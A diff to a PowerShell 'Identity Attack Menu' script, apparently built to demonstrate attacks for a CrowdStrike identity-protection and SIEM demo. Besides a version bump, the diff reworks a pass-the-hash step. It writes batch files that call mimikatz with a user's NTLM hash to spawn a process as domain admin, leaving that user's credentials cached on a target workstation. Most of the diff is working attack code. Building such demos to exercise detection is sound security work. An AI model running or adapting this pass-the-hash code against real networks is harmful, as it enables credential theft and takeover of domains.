@@ -1,7 +1,7 @@
 # ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
 #  CrowdStrike NGSIEM + Identity Protection Demo
-#  Version: 5.2 (2026-04-03)
+#  Version: 5.5.2 (2026-04-03)
 #
 #  Attack narrative:
 #    1. Phishing campaign (narrative)
@@ -112,7 +112,7 @@ function Show-StepBanner {
     Write-Host ""
 }
 
-$scriptVersion = "5.5"
+$scriptVersion = "5.5.2"
 Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  DT=$env:ENV_DT  UBUNTU=$env:ENV_UBUNTU" -ForegroundColor Green
 Start-Sleep -Seconds 2
@@ -967,13 +967,17 @@ public class CryptoMD4TGS {
 
             $doPtH = Read-Host "  Launch PtH prep? (Y/n)"
             if ($doPtH -ne 'n') {
-                # Write launcher batch. Key insight: mimikatz /run: passes the
-                # string directly to CreateProcessW. "cmd.exe /c batch.bat" works.
-                # No spaces in C:\IDP_Files path, so no nested quotes needed.
-                $pthLauncher = "$idpDir\launch_pth.bat"
-                $runCmd = "cmd.exe /k $prepBat"
+                # --- Write wrapper batch ---
+                # mimikatz /run: stops parsing at the first space, so
+                # "/run:cmd.exe /k prep.bat" only runs "cmd.exe" (blank window).
+                # Fix: a wrapper .bat with no spaces in path; CreateProcessWithLogonW
+                # handles .bat files via the shell association.
+                $pthWrapper = "$idpDir\pth_go.bat"
+                $wrapperContent = "@cmd.exe /c `"$prepBat`"`r`n"
+                [System.IO.File]::WriteAllText($pthWrapper, $wrapperContent, [System.Text.Encoding]::ASCII)
 
-                # Build the batch file content using StringBuilder to avoid PS quoting issues
+                # --- Write launcher batch (calls mimikatz with PtH) ---
+                $pthLauncher = "$idpDir\launch_pth.bat"
                 $sb = New-Object System.Text.StringBuilder
                 [void]$sb.AppendLine('@echo off')
                 [void]$sb.AppendLine('echo [*] Running mimikatz PtH as clark.monroe...')
@@ -985,7 +989,7 @@ public class CryptoMD4TGS {
                 [void]$sb.Append(' /ntlm:')
                 [void]$sb.Append($clarkHash)
                 [void]$sb.Append(' /run:')
-                [void]$sb.Append($runCmd)
+                [void]$sb.Append($pthWrapper)
                 [void]$sb.AppendLine('" "exit"')
                 [System.IO.File]::WriteAllText($pthLauncher, $sb.ToString(), [System.Text.Encoding]::ASCII)
 
@@ -995,7 +999,7 @@ public class CryptoMD4TGS {
                     Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$pthLauncher`""
                     Write-Host
                     Write-Host "  [+] PtH launched in new window." -ForegroundColor Green
-                    Write-Host "  [*] Follow the prompts in that window." -ForegroundColor Cyan
+                    Write-Host "  [*] The spawned window will auto-run the prep commands as DA." -ForegroundColor Cyan
                     Write-Host "  [*] When RDP opens, log in briefly then close it." -ForegroundColor Cyan
                     Write-Host "  [*] After that, clark.monroe creds will be cached on DT." -ForegroundColor Cyan
                 } catch {
